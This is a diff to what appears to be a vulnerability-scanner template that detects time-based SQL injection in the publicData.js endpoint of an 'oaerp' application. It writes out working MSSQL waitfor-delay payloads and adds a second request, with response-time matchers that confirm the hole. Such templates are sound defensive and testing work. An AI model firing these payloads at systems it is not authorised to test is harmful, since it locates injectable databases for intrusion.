@@ -8,17 +8,25 @@
 ## verification: true
 
 
-GET /oaerp/ui/common/publicData.js%70?type=getAllTableInfo&db=';waitfor+delay+'0:0:7'-- HTTP/1.1
+GET /oaerp/ui/common/publicData.js%70?type=getAllTableInfo&db=';waitfor+delay+'0:0:5'-- HTTP/1.1
 Host: {{Hostname}}
 User-Agent: {{random_ua}}
 
 #@ timeout: 20
 #@ condition: and
+#@ matcher: response_time >= 5
 #@ matcher: status_code == 200
-#@ matcher: response_time > 7
+
+---
+GET /oaerp/ui/common/publicData.js%70?type=getAllTableInfo&db=';waitfor+delay+'0:0:8'-- HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ timeout: 20
+#@ condition: and
+#@ matcher: response_time >= 8
+#@ matcher: status_code == 200
 
 
 
-
-
-# @VEIL-STAMP: a283552959a6adf2a9475664c4d5e2b861827d8944273262dde923786c8f7a39
+# @VEIL-STAMP: d3feb9ad163a1d8ccd9fe487146c3dc20930e109682931dd494a22a4e9a2113b
